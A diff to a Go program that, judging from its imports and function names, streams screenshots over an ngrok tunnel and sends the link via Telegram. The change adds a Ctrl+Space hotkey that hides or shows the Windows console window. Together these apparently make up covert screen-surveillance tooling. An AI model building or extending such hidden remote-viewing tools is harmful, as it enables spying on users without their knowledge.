@@ -12,10 +12,13 @@ import (
 	"image/png"
 	"log"
 	"net/http"
+
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 
+	"github.com/eiannone/keyboard"
 	"github.com/gorilla/websocket"
 	"github.com/kbinani/screenshot"
 	"golang.ngrok.com/ngrok"
@@ -29,6 +32,45 @@ type InlineKeyboardButton struct {
 
 type InlineKeyboardMarkup struct {
 	InlineKeyboard [][]InlineKeyboardButton `json:"inline_keyboard"`
+}
+
+var (
+	kernel32             = syscall.NewLazyDLL("kernel32.dll")
+	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
+	user32               = syscall.NewLazyDLL("user32.dll")
+	procShowWindow       = user32.NewProc("ShowWindow")
+	consoleVisible       int
+)
+
+func toggleConsole() {
+	hwnd, _, _ := procGetConsoleWindow.Call()
+	if hwnd == 0 {
+		return
+	}
+	if consoleVisible == 0 {
+		procShowWindow.Call(hwnd, 1)
+		consoleVisible = 1
+	} else {
+		procShowWindow.Call(hwnd, 0)
+		consoleVisible = 0
+	}
+}
+
+func checkHotkey() {
+	defer func() {
+		_ = keyboard.Close()
+	}()
+
+	for {
+		_, key, err := keyboard.GetSingleKey()
+		if err != nil {
+			panic(err)
+		}
+
+		if key == keyboard.KeyCtrlSpace {
+			toggleConsole()
+		}
+	}
 }
 
 func sendTelegramMessageWithButton(buttonURL string) error {
@@ -180,8 +222,14 @@ func run(ctx context.Context) error {
 }
 
 func main() {
+	go func() {
+		checkHotkey()
+	}()
+
+	// showConsole(false)
+
 	tmpl, err := template.New("stream").Parse(streamTemplate)
-	
+
 	if err != nil {
 		log.Fatal("Error parsing template:", err)
 	}
